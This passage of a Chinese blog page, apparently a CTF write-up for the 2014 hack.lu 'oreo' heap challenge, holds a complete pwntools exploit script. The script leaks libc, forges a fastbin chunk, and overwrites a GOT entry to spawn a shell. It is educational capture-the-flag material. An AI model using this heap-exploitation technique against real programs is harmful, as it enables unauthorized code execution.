class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./oreo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">""</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#first leak the libc</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">    result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">    puts_addr = u32(result)</span><br><span class="line">    log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second fake bin</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">        add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">### begin fake </span></span><br><span class="line">    payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    edit(payload)</span><br><span class="line">    delete()</span><br><span class="line">    p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br><span class="line">    payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0x5fbc5</span></span><br><span class="line">    <span class="comment">#payload = p32(one_gadget)</span></span><br><span class="line">    payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">    edit(payload)</span><br><span class="line">    puts()</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题相对简单，只是进行了got表覆写，希望自己在安全之路上越走越远</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/re/ddctf-re1-2/" rel="next" title="ddctf-re1_2">
+                <i class="fa fa-chevron-left"></i> ddctf-re1_2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/09/pwn/pwn-ret2dllruntime/" rel="prev" title="pwn-ret2dllruntime">
+                pwn-ret2dllruntime <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">LiHua</p>
+              <p class="site-description motion-element" itemprop="description">One people that no one know</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">62</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fastbin-attack之house-of-Sprit"><span class="nav-number">1.</span> <span class="nav-text">fastbin-attack之house of Sprit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2014-hack-lu-oreo"><span class="nav-number">1.1.</span> <span class="nav-text">2014 hack.lu oreo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#结构体构造"><span class="nav-number">1.1.1.</span> <span class="nav-text">结构体构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#整体思路"><span class="nav-number">1.1.2.</span> <span class="nav-text">整体思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#初始化函数"><span class="nav-number">1.1.3.</span> <span class="nav-text">初始化函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#leak地址"><span class="nav-number">1.1.4.</span> <span class="nav-text">leak地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#填充大小并修改next指针"><span class="nav-number">1.1.5.</span> <span class="nav-text">填充大小并修改next指针</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过检测"><span class="nav-number">1.1.6.</span> <span class="nav-text">绕过检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#覆写got表"><span class="nav-number">1.1.7.</span> <span class="nav-text">覆写got表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LiHua</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
